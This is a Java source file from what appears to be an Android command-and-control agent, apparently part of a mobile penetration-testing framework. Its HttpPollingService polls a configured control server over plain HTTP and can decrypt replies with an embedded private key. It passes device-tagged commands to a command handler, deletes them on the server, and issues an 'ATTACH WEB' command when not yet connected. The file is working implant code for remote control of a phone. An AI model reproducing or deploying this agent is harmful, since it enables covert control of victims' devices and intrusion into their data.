package com.shevirah.androidagent;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.virgilsecurity.sdk.crypto.Crypto;
import com.virgilsecurity.sdk.crypto.PrivateKey;
import com.virgilsecurity.sdk.crypto.PublicKey;
import com.virgilsecurity.sdk.crypto.VirgilCrypto;

import static com.shevirah.androidagent.StagerActivity.getPhoneNumberOrIP;
import static com.shevirah.androidagent.Util.isFileExist;
import static com.shevirah.androidagent.Util.logRequest;
import static com.shevirah.androidagent.Util.printExtras;

public class HttpPollingService extends IntentService {
    private static final String TAG = "HttpPollingService";
    public static final String CONNECTED = "connected";

    public HttpPollingService() {
        super("HttpPollingService");
    }

    protected void onHandleIntent(Intent intent) {
        try {
            onHandle(intent);
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "onHandleIntent: ", e);
        }
    }

    private void onHandle(Intent intent) {
        if (Const.DEBUG) printExtras(TAG, intent.getExtras(), "args ");

        if (isFileExist(getFilesDir() + "/" + CONNECTED)) {
            String baseUrl =
                    "http://" + getString(R.string.controlIP) + getString(R.string.controlpath);

            String url = baseUrl + getString(R.string.urii);

            HttpRequest httpRequest = HttpRequest.get(url);
            String body = httpRequest.body();
            int code = httpRequest.code();
            if (Const.DEBUG) logRequest(TAG, code, body, url);

            if (code != 200) {
                return;
            }


            if ((getResources().getString(R.string.use_virgil_security)).equals("true")){
                Crypto crypto = new VirgilCrypto();
                PrivateKey privateKey = crypto.importPrivateKey(getString(R.string.virgil_private_key1).getBytes());
                byte[] decryptedData = crypto.decrypt(body.getBytes(), privateKey);
                body = new String(decryptedData);
            }

            int newLineIndex = body.indexOf('\n');
            if (newLineIndex != -1) {
                // read only first single line from response
                body = body.substring(0, newLineIndex);
            }

            String userPhoneId = getString(R.string.key) + "-" + getPhoneNumberOrIP(this);

            if (body.startsWith(userPhoneId)) {
                startCommandService(body);
                deleteCommandOnServer(baseUrl, body);
            }
        } else {
            String command = getString(R.string.key) + " " + CommandHandlerService.ATTACH + " WEB";
            startCommandService(command);
        }
    }

    private void deleteCommandOnServer(String baseUrl, String bodyToPost) {
        String url = baseUrl + getString(R.string.urij);
        HttpRequest request = HttpRequest.post(url);
        bodyToPost = "deleteline=" + bodyToPost;
        request.send(bodyToPost);
        if (Const.DEBUG) logRequest(TAG, request.code(), request.body(), url, bodyToPost);
    }

    private void startCommandService(String body) {
        Intent intent = new Intent(this, CommandHandlerService.class);
        intent.putExtra(CommandHandlerService.EXTRA_MESSAGE, body);
        startService(intent);
    }
}


